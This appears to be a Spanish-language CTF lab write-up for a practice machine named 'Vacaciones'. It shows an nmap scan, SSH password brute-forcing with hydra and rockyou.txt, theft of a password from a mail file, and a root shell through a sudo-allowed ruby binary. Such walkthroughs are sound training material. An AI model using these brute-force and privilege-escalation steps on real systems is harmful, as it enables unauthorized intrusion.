---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Vacaciones

Empezamos con un escaneo de puertos para ver los servicios que está corriendo la máquina:

```bash
nmap -sC -sV $IPTARGET
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site does not have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La página web que aloja nos muestra lo siguiente en el código fuente:

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

Intentando hacer fuerza bruta con el usuario que indica en el mensaje (`camilo`):

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://$IPTARGET
```

```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
```

Mirando el mensaje anterior, kisko me ha hecho pensar que puede estar en la carpeta `/var/mail/`.

```bash
ls -la /var/mail/camilo
```

```bash
total 12
drwxr-sr-x 2 root mail 4096 Apr 25  2024 .
drwxrwsr-x 1 root mail 4096 Apr 25  2024 ..
-rw-r--r-- 1 root mail  144 Apr 25  2024 correo.txt
```

```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Como el correo lo enviaba Juan, podemos iniciar sesión con Juan con `su juan`. Una vez dentro con este usuario, vemos los permisos que tenemos con `sudo -l`:

```
Matching Defaults entries for juan on 5b47abf18274:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 5b47abf18274:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Buscamos el binario `/usr/bin/ruby` en [gtfobins](https://gtfobins.github.io/gtfobins) y vemos que hay una vulnerabilidad con `sudo` para este binario:

```bash
sudo ruby -e 'exec "/bin/sh"'
```

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250723013054.png" alt=""><figcaption></figcaption></figure></div>
